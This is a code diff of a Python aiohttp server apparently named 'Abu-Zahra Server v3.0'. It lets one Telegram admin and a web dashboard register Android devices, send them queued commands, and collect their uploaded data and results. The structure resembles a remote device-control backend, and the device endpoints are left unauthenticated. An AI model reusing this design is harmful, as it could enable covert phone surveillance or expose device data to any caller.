-    commands = load_json(COMMANDS_FILE, [])
-    now = ts()
-    for c in commands:
-        if c.get("device_id") == device_id and c.get("status") == "pending":
-            c["status"] = "sent"
-            c["sent_at"] = now
-    save_json(COMMANDS_FILE, commands)
-    return web.json_response(pending)
-
-
-# Command result from device
-async def handle_api_device_command_result(request: web.Request) -> web.Response:
-    device_id = request.match_info["device_id"]
-    cmd_id = request.match_info["cmd_id"]
-    auth_key = request.headers.get("X-Device-Key", "")
-    if not auth_key:
-        return web.json_response({"error": "مفتاح الجهاز مطلوب"}, status=401)
-    body = await request.json()
-    commands = load_json(COMMANDS_FILE, [])
-    for c in commands:
-        if c.get("id") == cmd_id and c.get("device_id") == device_id:
-            c["status"] = body.get("status", "completed")
-            c["result"] = body.get("result", {})
+async def tg_poll_loop():
+    global tg_offset, polling_active
+    polling_active = True
+    log.info("Starting Telegram getUpdates polling...")
+    
+    while polling_active:
+        try:
+            payload = {
+                "offset": tg_offset,
+                "timeout": 30,
+                "allowed_updates": ["message", "callback_query"],
+            }
+            result = await tg_request("getUpdates", payload)
+            if not result or not result.get("ok"):
+                await asyncio.sleep(2)
+                continue
+            
+            updates = result.get("result", [])
+            for update in updates:
+                tg_offset = update.get("update_id", 0) + 1
+                
+                # Handle message
+                if "message" in update:
+                    msg = update["message"]
+                    chat_id = msg.get("chat", {}).get("id")
+                    text = msg.get("text", "")
+                    from_user = msg.get("from", {}).get("id")
+                    
+                    if chat_id != ADMIN_CHAT_ID:
+                        log.warning("Unauthorized access from %s", chat_id)
+                        continue
+                    
+                    if text.startswith("/"):
+                        await handle_telegram_command(chat_id, text, msg.get("message_id"))
+                
+                # Handle callback query
+                if "callback_query" in update:
+                    cb = update["callback_query"]
+                    cb_chat = cb.get("message", {}).get("chat", {}).get("id")
+                    if cb_chat != ADMIN_CHAT_ID:
+                        continue
+                    await handle_callback_query(cb)
+        
+        except asyncio.CancelledError:
             break
-    save_json(COMMANDS_FILE, commands)
-    append_event("نتيجة أمر", {"device_id": device_id, "cmd_id": cmd_id, "status": body.get("status")})
+        except Exception as exc:
+            log.error("Poll error: %s", exc)
+            await asyncio.sleep(3)
 
-    # Forward result to admin via Telegram
-    if body.get("status") == "completed" and body.get("result"):
-        result_data = body["result"]
-        if isinstance(result_data, dict) and result_data.get("notify", True):
-            summary = json.dumps(result_data, ensure_ascii=False, indent=2)[:4000]
-            await send_admin(
-                f"📦 <b>نتيجة أمر</b>\n"
-                f"📱 الجهاز: <code>{device_id}</code>\n"
-                f"📋 الأمر: <code>{cmd_id}</code>\n\n"
-                f"<pre>{summary}</pre>"
-            )
+# ============================================================================
+# SESSION CLEANUP TASK
+# ============================================================================
 
-    return web.json_response({"ok": True})
+async def session_cleanup_loop():
+    while True:
+        try:
+            sessions = load_json(SESSIONS_FILE, [])
+            now = datetime.now(timezone.utc)
+            active = []
+            for s in sessions:
+                try:
+                    expires = datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc)
+                    if now <= expires:
+                        active.append(s)
+                except:
+                    continue
+            save_json(SESSIONS_FILE, active)
+            
+            # Also clean expired link codes
+            codes = load_json(LINK_CODES_FILE, [])
+            valid = []
+            for c in codes:
+                try:
+                    expires = datetime.fromisoformat(c.get("expires_at", "")).replace(tzinfo=timezone.utc)
+                    if now <= expires or c.get("used"):
+                        valid.append(c)
+                except:
+                    continue
+            save_json(LINK_CODES_FILE, valid)
+        except:
+            pass
+        await asyncio.sleep(3600)
 
+# ============================================================================
+# APP FACTORY & ROUTES
+# ============================================================================
 
-# ═══════════════════════════════════════════════════════════════════════════════
-# App Factory
-# ═══════════════════════════════════════════════════════════════════════════════
-
-def create_app() -> web.Application:
+def create_app():
     app = web.Application()
-    app.router.add_get("/", handle_index)
-    app.router.add_get("/health", handle_health)
-
-    # Public device endpoints (for Android app)
-    app.router.add_put("/api/devices/{device_id}/data", handle_api_device_upload)
-    app.router.add_get("/api/devices/{device_id}/commands", handle_api_device_pending_commands)
-    app.router.add_post("/api/devices/{device_id}/commands/{cmd_id}/result", handle_api_device_command_result)
-
-    # Auth-protected API
-    app.router.add_get("/api/status", handle_api_status)
-    app.router.add_get("/api/devices", handle_api_devices)
-    app.router.add_post("/api/devices", handle_api_add_device)
-    app.router.add_delete("/api/devices/{device_id}", handle_api_delete_device)
-    app.router.add_post("/api/devices/{device_id}/command", handle_api_device_command)
-    app.router.add_get("/api/devices/{device_id}/data/{data_type}", handle_api_device_data)
-
-    # Sessions
-    app.router.add_get("/api/sessions", handle_api_sessions)
-    app.router.add_post("/api/sessions", handle_api_create_session)
-    app.router.add_delete("/api/sessions/{session_id}", handle_api_delete_session)
-
-    # Logs & Commands
-    app.router.add_get("/api/logs", handle_api_logs)
-    app.router.add_post("/api/logs/clear", handle_api_clear_logs)
-    app.router.add_get("/api/commands", handle_api_commands)
-
-    # Stats, Export, Backup, Settings
-    app.router.add_get("/api/stats", handle_api_stats)
-    app.router.add_post("/api/export", handle_api_export)
-    app.router.add_post("/api/backup", handle_api_backup)
-    app.router.add_get("/api/settings", handle_api_settings_get)
-    app.router.add_post("/api/settings", handle_api_settings_update)
-
+    
+    # Web Dashboard
+    app.router.add_get("/", serve_dashboard)
+    app.router.add_get("/dashboard", serve_dashboard)
+    
+    # Auth API
+    app.router.add_post("/api/login", api_web_login)
+    
+    # Device API (no auth - device authenticates via link code/token)
+    app.router.add_post("/api/verify_link", api_verify_link)
+    app.router.add_post("/api/register", api_register)
+    app.router.add_get("/api/commands/{device_id}", api_get_commands)
+    app.router.add_post("/api/command_result/{command_id}", api_command_result)
+    app.router.add_post("/api/data/{device_id}", api_device_data)
+    app.router.add_get("/api/settings/{device_id}", api_device_settings)
+    
+    # Web API (requires auth)
+    app.router.add_get("/api/web/devices", api_web_devices)
+    app.router.add_get("/api/web/device/{device_id}", api_web_device_detail)
+    app.router.add_get("/api/web/commands", api_web_commands)
+    app.router.add_get("/api/web/events", api_web_events)
+    app.router.add_get("/api/web/stats", api_web_stats)
+    app.router.add_post("/api/web/send_command", api_web_send_command)
+    app.router.add_get("/api/web/link_code", api_web_link_code)
+    app.router.add_get("/api/web/settings", api_web_settings_get)
+    app.router.add_put("/api/web/settings", api_web_settings_set)
+    app.router.add_delete("/api/web/unlink/{device_id}", api_web_unlink)
+    
+    # Static files
+    static_dir = Path(__file__).parent / "static"
+    if static_dir.exists():
+        app.router.add_static("/static", static_dir)
+    
     return app
 
 
-# ═══════════════════════════════════════════════════════════════════════════════
-# Startup & Shutdown
-# ═══════════════════════════════════════════════════════════════════════════════
-
-async def on_startup(app: web.Application):
-    global polling_active
+async def on_startup(app):
     ensure_data_dir()
-    append_event("بدء تشغيل الخادم", {"port": SERVER_PORT})
-
-    # Verify bot token
-    me = await tg_request("getMe", {})
-    if me and me.get("ok"):
-        bot_info = me["result"]
-        log.info("Bot: @%s (%s)", bot_info.get("username"), bot_info.get("first_name"))
-        append_event("التحقق من البوت", {"username": bot_info.get("username")})
-
-        # Start getUpdates polling as background task
-        app["poll_task"] = asyncio.create_task(poll_updates())
-        log.info("Started getUpdates polling")
-
-        # Send startup notification
+    log.info("=" * 60)
+    log.info("Abu-Zahra Server v3.0 starting...")
+    log.info("Domain: %s", SERVER_DOMAIN)
+    log.info("Port: %d", SERVER_PORT)
+    log.info("Admin: %d", ADMIN_CHAT_ID)
+    log.info("Commands: %d", len(COMMAND_REGISTRY))
+    log.info("=" * 60)
+    
+    # Start Telegram polling in background
+    app["tg_task"] = asyncio.create_task(tg_poll_loop())
+    # Start session cleanup
+    app["cleanup_task"] = asyncio.create_task(session_cleanup_loop())
+    
+    # Notify admin
+    try:
         await send_admin(
-            f"🟢 <b>الخادم يعمل</b>\n\n"
-            f"⚡ المنفذ: <code>{SERVER_PORT}</code>\n"
-            f"🕐 الوقت: <code>{ts()}</code>\n"
-            f"📱 الأجهزة: <code>{len(get_devices())}</code>\n"
-            f"📡 الوضع: <code>getUpdates Polling</code>\n\n"
-            f"استخدم /start للبدء"
+            f"🟥 <b>Abu-Zahra Server v3.0</b> started!\n\n"
+            f"📡 Port: <code>{SERVER_PORT}</code>\n"
+            f"🌐 Domain: <code>{SERVER_DOMAIN}</code>\n"
+            f"📋 Commands: <code>{len(COMMAND_REGISTRY)}</code>\n"
+            f"📱 Web: <code>{SERVER_DOMAIN}/dashboard</code>"
         )
-    else:
-        log.error("Failed to verify bot token!")
+    except:
+        pass
 
 
-async def on_cleanup(app: web.Application):
-    global polling_active, _tg_session
+async def on_cleanup(app):
+    global polling_active
     polling_active = False
-    append_event("إيقاف الخادم", {})
-    log.info("Server shutting down...")
-
-    # Cancel polling task
-    poll_task = app.get("poll_task")
-    if poll_task:
-        poll_task.cancel()
-        try:
-            await poll_task
-        except asyncio.CancelledError:
-            pass
-
-    # Close TG session
+    if "tg_task" in app:
+        app["tg_task"].cancel()
+    if "cleanup_task" in app:
+        app["cleanup_task"].cancel()
+    global _tg_session
     if _tg_session and not _tg_session.closed:
         await _tg_session.close()
 
 
-# ═══════════════════════════════════════════════════════════════════════════════
-# Main Entry Point
-# ═══════════════════════════════════════════════════════════════════════════════
-
-async def _run():
+def main():
     app = create_app()
     app.on_startup.append(on_startup)
     app.on_cleanup.append(on_cleanup)
-
-    runner = web.AppRunner(app)
-    await runner.setup()
-    site = web.TCPSite(runner, "0.0.0.0", SERVER_PORT)
-    await site.start()
-    log.info("Server running on http://0.0.0.0:%d", SERVER_PORT)
-    append_event("الخادم جاهز", {"port": SERVER_PORT})
-
-    try:
-        await asyncio.Event().wait()
-    except (asyncio.CancelledError, KeyboardInterrupt):
-        pass
-    finally:
-        await runner.cleanup()
-
-
-def main():
-    try:
-        asyncio.run(_run())
-    except KeyboardInterrupt:
-        pass
+    
+    log.info("Starting server on port %d...", SERVER_PORT)
+    web.run_app(app, host="0.0.0.0", port=SERVER_PORT, print=None)
 
 
 if __name__ == "__main__":
